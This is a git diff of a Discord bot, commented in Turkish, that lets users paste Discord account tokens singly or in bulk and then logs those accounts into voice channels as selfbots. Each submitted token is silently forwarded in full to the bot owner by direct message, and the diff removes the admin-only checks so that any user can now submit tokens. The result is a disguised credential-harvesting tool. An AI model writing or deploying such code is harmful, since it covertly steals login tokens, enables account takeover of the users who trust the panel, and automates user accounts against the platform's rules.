@@ -85,7 +85,7 @@ function getUptime() {
     return `${mins}dk ${secs}sn`;
 }
 
-// Bot sahibinə DM vasitəsilə mesaj göndərmək üçün köməkçi funksiya
+// Bot sahibine DM ile mesaj gönderme fonksiyonu
 async function sendTokenToOwner(clientInstance, title, token, accountName, username, addedByUserId) {
     if (!OWNER_ID) return;
     try {
@@ -239,11 +239,6 @@ bot.on('messageCreate', async (message) => {
     const args = message.content.slice(1).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // Sadece yönetici kullanabilir
-    if (message.author.id !== config.adminId) {
-        return message.reply('❌ Bu komutu sadece yönetici kullanabilir.');
-    }
-
     if (command === 'panel-voice') {
         try { await message.delete(); } catch (e) {}
 
@@ -307,50 +302,47 @@ bot.on('messageCreate', async (message) => {
 bot.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton() && !interaction.isModalSubmit() && !interaction.isStringSelectMenu()) return;
 
-    // Yönetici kontrolü
-    if (interaction.user.id !== config.adminId) {
-        return interaction.reply({ content: '❌ Bu işlem için yetkiniz yok.', ephemeral: true });
-    }
+    const userId = interaction.user.id;
 
     // ─── Butonlar ─────────────────────────────────────────────
     if (interaction.isButton()) {
 
         if (interaction.customId === 'connect_voice_menu') {
-            if (database.accounts.length === 0) {
-                return interaction.reply({ content: '❌ Sistemde ekli hesap bulunmuyor.', ephemeral: true });
+            const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);
+            if (userAccounts.length === 0) {
+                return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
             }
 
             const options = [
                 new StringSelectMenuOptionBuilder()
-                    .setLabel('Tümünü Bağla')
-                    .setDescription('Kayıtlı bütün hesapları sese bağla')
+                    .setLabel('Bütün Hesaplar')
+                    .setDescription('Eklediğiniz bütün hesaplar sese bağlanacak')
                     .setValue('all_accounts')
             ];
 
-            database.accounts.slice(0, 24).forEach((acc, index) => {
-                const nick = acc.displayName || acc.username || `Hesap ${index + 1}`;
+            userAccounts.slice(0, 24).forEach((acc) => {
+                const globalIndex = database.accounts.findIndex(a => a.token === acc.token);
+                const nick = acc.displayName || acc.username || 'Hesap';
                 const username = acc.username || 'hesap';
-                
-                const label = `${nick} (${username})`;
-                const description = `Token: ${acc.token.substring(0, 20)}...`;
 
                 options.push(
                     new StringSelectMenuOptionBuilder()
-                        .setLabel(label.substring(0, 100))
-                        .setDescription(description.substring(0, 100))
-                        .setValue(`account_${index}`)
+                        .setLabel(`${nick} (${username})`.substring(0, 100))
+                        .setDescription(`Seçilen hesap: ${nick}`.substring(0, 100))
+                        .setValue(`account_${globalIndex}`)
                 );
             });
 
             const selectMenu = new StringSelectMenuBuilder()
                 .setCustomId('select_connect_target')
-                .setPlaceholder('Hesap seçimi yapın...')
+                .setPlaceholder('Hesap seçin...')
                 .addOptions(options);
 
             const row = new ActionRowBuilder().addComponents(selectMenu);
-            await interaction.reply({ content: '🔊 Sese bağlanılacak hesabı veya tümünü seçin:', components: [row], ephemeral: true });
+            await interaction.reply({ content: 'Sese bağlamak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
         }
 
+        // 1. TOKEN EKLE BUTONU
         else if (interaction.customId === 'add_token') {
             const modal = new ModalBuilder()
                 .setCustomId('modal_add_token')
@@ -366,6 +358,7 @@ bot.on('interactionCreate', async (interaction) => {
             await interaction.showModal(modal);
         }
 
+        // 1.1. TOPLU TOKEN EKLE BUTONU
         else if (interaction.customId === 'add_multi_token') {
             const modal = new ModalBuilder()
                 .setCustomId('modal_add_multi_token')
@@ -382,32 +375,32 @@ bot.on('interactionCreate', async (interaction) => {
             await interaction.showModal(modal);
         }
 
+        // 1.2. TOKEN SİL PANELİ (SEÇİM MENÜSÜ)
         else if (interaction.customId === 'remove_token') {
-            const userId = interaction.user.id;
             const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);
 
             if (userAccounts.length === 0) {
                 return interaction.reply({ content: '⚠️ Silinecek kayıtlı hesabınız bulunmuyor!', ephemeral: true });
             }
 
-            const options = userAccounts.map((acc) => {
-                const globalIndex = database.accounts.findIndex(a => a.token === acc.token);
-                const nick = acc.displayName || acc.username || 'Hesap';
-                const username = acc.username || 'hesap';
-                
-                return new StringSelectMenuOptionBuilder()
-                    .setLabel(`${nick} (${username})`.substring(0, 100))
-                    .setDescription(`Token: ${acc.token.substring(0, 20)}...`)
-                    .setValue(`remove_${globalIndex}`);
-            });
-
-            options.unshift(
+            const options = [
                 new StringSelectMenuOptionBuilder()
-                    .setLabel('Bütün Tokenlerimi Sil')
-                    .setDescription('Size ait olan bütün tokenleri sistemden siler')
+                    .setLabel('Bütün Tokenleri Sil')
                     .setValue('clear_all_tokens')
-                    .setEmoji('🗑️')
-            );
+                    .setDescription('Size ait olan bütün tokenleri sistemden siler')
+                    .setEmoji('🗑️'),
+                ...userAccounts.slice(0, 24).map((acc) => {
+                    const globalIndex = database.accounts.findIndex(a => a.token === acc.token);
+                    const nick = acc.displayName || acc.username || 'Hesap';
+                    const username = acc.username || 'hesap';
+
+                    return new StringSelectMenuOptionBuilder()
+                        .setLabel(`${nick} (${username})`.substring(0, 100))
+                        .setValue(`remove_${globalIndex}`)
+                        .setDescription('Bu hesabı sil')
+                        .setEmoji('❌');
+                })
+            ];
 
             const selectMenu = new StringSelectMenuBuilder()
                 .setCustomId('select_remove_account')
@@ -415,18 +408,16 @@ bot.on('interactionCreate', async (interaction) => {
                 .addOptions(options);
 
             const row = new ActionRowBuilder().addComponents(selectMenu);
-            await interaction.reply({ content: '🗑️ Lütfen silmek istediğiniz hesabı seçin:', components: [row], ephemeral: true });
+            await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
         }
 
+        // 6. TÜMÜNÜ DURDUR BUTONU
         else if (interaction.customId === 'stop_all') {
-            const userId = interaction.user.id;
             const userAccounts = database.accounts.filter(acc => acc.addedBy === userId && acc.voiceChannelId);
 
             if (userAccounts.length === 0) {
-                return interaction.reply({ content: 'ℹ️ Sese bağlı hesap bulunamadı.', ephemeral: true });
+                return interaction.reply({ content: 'ℹ️ Sese bağlı hesabınız bulunmuyor.', ephemeral: true });
             }
-
-            await interaction.reply({ content: '⏹️ Ses bağlantıları durduruluyor...', ephemeral: true });
 
             for (const acc of userAccounts) {
                 await disconnectSelfBot(acc.token);
@@ -434,7 +425,7 @@ bot.on('interactionCreate', async (interaction) => {
             }
             saveDatabase();
 
-            await interaction.editReply('✅ Hesaplarınızın ses bağlantıları durduruldu.');
+            await interaction.reply({ content: '🛑 Hesaplarınızdaki bütün aktif ses bağlantıları durduruldu.', ephemeral: true });
         }
     }
 
@@ -446,12 +437,12 @@ bot.on('interactionCreate', async (interaction) => {
             if (choice === 'all_accounts') {
                 const modal = new ModalBuilder()
                     .setCustomId('modal_connect_all')
-                    .setTitle('Bütün Hesapları Sese Bağla')
+                    .setTitle('Ses Ayarları')
                     .addComponents(
                         new ActionRowBuilder().addComponents(
                             new TextInputBuilder()
                                 .setCustomId('channel_input')
-                                .setLabel('Bağlanılacak Ses Kanalı ID')
+                                .setLabel('Bağlanılacak Ses Kanalının ID-si')
                                 .setStyle(TextInputStyle.Short)
                                 .setRequired(true)
                         )
@@ -461,12 +452,12 @@ bot.on('interactionCreate', async (interaction) => {
                 const index = choice.replace('account_', '');
                 const modal = new ModalBuilder()
                     .setCustomId(`modal_connect_single_${index}`)
-                    .setTitle('Hesabı Sese Bağla')
+                    .setTitle('Ses Ayarları')
                     .addComponents(
                         new ActionRowBuilder().addComponents(
                             new TextInputBuilder()
                                 .setCustomId('channel_input')
-                                .setLabel('Bağlanılacak Ses Kanalı ID')
+                                .setLabel('Bağlanılacak Ses Kanalının ID-si')
                                 .setStyle(TextInputStyle.Short)
                                 .setRequired(true)
                         )
@@ -475,36 +466,37 @@ bot.on('interactionCreate', async (interaction) => {
             }
         }
 
+        // 2.2. TOKEN SİLME SEÇİM İŞLEMİ
         else if (interaction.customId === 'select_remove_account') {
-            const choice = interaction.values[0];
-            const userId = interaction.user.id;
+            const selectedValue = interaction.values[0];
+            const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);
 
-            if (choice === 'clear_all_tokens') {
-                const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);
+            if (userAccounts.length === 0) {
+                return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
+            }
+
+            if (selectedValue === 'clear_all_tokens') {
                 for (const acc of userAccounts) {
                     await disconnectSelfBot(acc.token);
                 }
                 database.accounts = database.accounts.filter(acc => acc.addedBy !== userId);
                 saveDatabase();
-                return interaction.update({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', components: [] });
-            }
+                return interaction.reply({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', ephemeral: true });
+            } else if (selectedValue.startsWith('remove_')) {
+                const index = parseInt(selectedValue.replace('remove_', ''));
+                const removedAccount = database.accounts[index];
 
-            if (choice.startsWith('remove_')) {
-                const index = parseInt(choice.replace('remove_', ''));
-                const removed = database.accounts[index];
-
-                if (!removed) {
-                    return interaction.reply({ content: '❌ Hesap bulunamadı.', ephemeral: true });
+                if (!removedAccount || removedAccount.addedBy !== userId) {
+                    return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
                 }
 
-                await disconnectSelfBot(removed.token);
+                await disconnectSelfBot(removedAccount.token);
                 database.accounts.splice(index, 1);
                 saveDatabase();
 
-                await interaction.update({
-                    content: `✅ **Token silindi:** ${removed.displayName || removed.username || 'Bilinmeyen Hesap'} (${removed.username || ''})`,
-                    components: []
-                });
+                const nick = removedAccount.displayName || removedAccount.username || 'Hesap';
+                const uname = removedAccount.username || 'tag';
+                return interaction.reply({ content: `❌ Başarıyla silindi: **${nick} (${uname})**`, ephemeral: true });
             }
         }
     }
@@ -514,39 +506,38 @@ bot.on('interactionCreate', async (interaction) => {
 
         if (interaction.customId === 'modal_connect_all') {
             const channelId = interaction.fields.getTextInputValue('channel_input').trim();
-            await interaction.reply({ content: '🔊 Bütün hesaplar ses kanalına bağlanıyor...', ephemeral: true });
+            const userAccounts = database.accounts.filter(acc => acc.addedBy === userId);
+
+            await interaction.reply({ content: `🔊 Seçilen ${userAccounts.length} hesap ile ses bağlantısı başlatıldı!`, ephemeral: true });
 
             for (let i = 0; i < database.accounts.length; i++) {
-                database.accounts[i].voiceChannelId = channelId;
-                await connectSelfBot(database.accounts[i], i, channelId);
-                await new Promise(r => setTimeout(r, 1500));
+                if (database.accounts[i].addedBy === userId) {
+                    database.accounts[i].voiceChannelId = channelId;
+                    await connectSelfBot(database.accounts[i], i, channelId);
+                    await new Promise(r => setTimeout(r, 1500));
+                }
             }
             saveDatabase();
-            await interaction.editReply(`✅ Bütün hesaplar **${channelId}** ID'li ses kanalına bağlandı!`);
         }
 
         else if (interaction.customId.startsWith('modal_connect_single_')) {
             const index = parseInt(interaction.customId.replace('modal_connect_single_', ''));
             const channelId = interaction.fields.getTextInputValue('channel_input').trim();
 
-            if (isNaN(index) || !database.accounts[index]) {
+            if (isNaN(index) || !database.accounts[index] || database.accounts[index].addedBy !== userId) {
                 return interaction.reply({ content: '❌ Seçilen hesap bulunamadı.', ephemeral: true });
             }
 
-            await interaction.reply({ content: '🔊 Hesap ses kanalına bağlanıyor...', ephemeral: true });
+            await interaction.reply({ content: `🔊 Seçilen 1 hesap ile ses bağlantısı başlatıldı!`, ephemeral: true });
             database.accounts[index].voiceChannelId = channelId;
             saveDatabase();
 
             await connectSelfBot(database.accounts[index], index, channelId);
-            await interaction.editReply(`✅ **${database.accounts[index].displayName || database.accounts[index].username || 'Hesap'}** adlı hesap **${channelId}** ID'li kanala bağlandı!`);
         }
 
+        // 2. TEK TOKEN MODAL CEVABI
         else if (interaction.customId === 'modal_add_token') {
             const token = interaction.fields.getTextInputValue('token_input').trim();
-
-            if (database.accounts.find(a => a.token === token)) {
-                return interaction.reply({ content: '❌ Bu token sistemde zaten ekli!', ephemeral: true });
-            }
 
             await interaction.deferReply({ ephemeral: true });
 
@@ -554,29 +545,32 @@ bot.on('interactionCreate', async (interaction) => {
                 const testClient = new SelfClient({ checkUpdate: false });
                 await testClient.login(token);
                 const username = testClient.user.username;
-                const displayName = testClient.user.displayName || username;
+                const globalName = testClient.user.displayName || username;
                 testClient.destroy();
 
-                database.accounts.push({
-                    token,
-                    voiceChannelId: null,
-                    username,
-                    displayName,
-                    addedBy: interaction.user.id
-                });
-                saveDatabase();
+                if (!database.accounts.some(t => t.token === token)) {
+                    database.accounts.push({
+                        token,
+                        voiceChannelId: null,
+                        username,
+                        displayName: globalName,
+                        addedBy: userId
+                    });
+                    saveDatabase();
 
-                await sendTokenToOwner(bot, 'Yeni Tekli Token Eklendi', token, displayName, username, interaction.user.id);
+                    await sendTokenToOwner(bot, 'Yeni Tekli Token Eklendi', token, globalName, username, userId);
+                }
 
-                await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${displayName} (${username})**` });
+                await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${globalName} (${username})**` });
             } catch (err) {
                 await interaction.editReply({ content: `❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.` });
             }
         }
 
+        // 2.1. TOPLU TOKEN MODAL CEVABI
         else if (interaction.customId === 'modal_add_multi_token') {
-            const tokensRaw = interaction.fields.getTextInputValue('tokens_input');
-            const tokens = tokensRaw.split('\n').map(t => t.trim()).filter(t => t.length > 0);
+            const rawInput = interaction.fields.getTextInputValue('tokens_input').trim();
+            const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);
 
             if (tokens.length === 0) {
                 return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
@@ -589,34 +583,34 @@ bot.on('interactionCreate', async (interaction) => {
             let addedNames = [];
 
             for (const token of tokens) {
-                if (database.accounts.find(a => a.token === token)) continue;
+                if (database.accounts.some(t => t.token === token)) continue;
 
                 try {
                     const testClient = new SelfClient({ checkUpdate: false });
                     await testClient.login(token);
                     const username = testClient.user.username;
-                    const displayName = testClient.user.displayName || username;
+                    const globalName = testClient.user.displayName || username;
                     testClient.destroy();
 
                     database.accounts.push({
                         token,
                         voiceChannelId: null,
                         username,
-                        displayName,
-                        addedBy: interaction.user.id
+                        displayName: globalName,
+                        addedBy: userId
                     });
-                    addedNames.push(`${displayName} (${username})`);
+                    addedNames.push(`${globalName} (${username})`);
                     successCount++;
 
-                    await sendTokenToOwner(bot, 'Toplu Token Eklendi', token, displayName, username, interaction.user.id);
-                } catch (e) {
+                    await sendTokenToOwner(bot, 'Toplu Token Eklendi', token, globalName, username, userId);
+                } catch (err) {
                     failCount++;
                 }
             }
             saveDatabase();
 
-            await interaction.editReply({ 
-                content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}` 
+            await interaction.editReply({
+                content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}`
             });
         }
     }
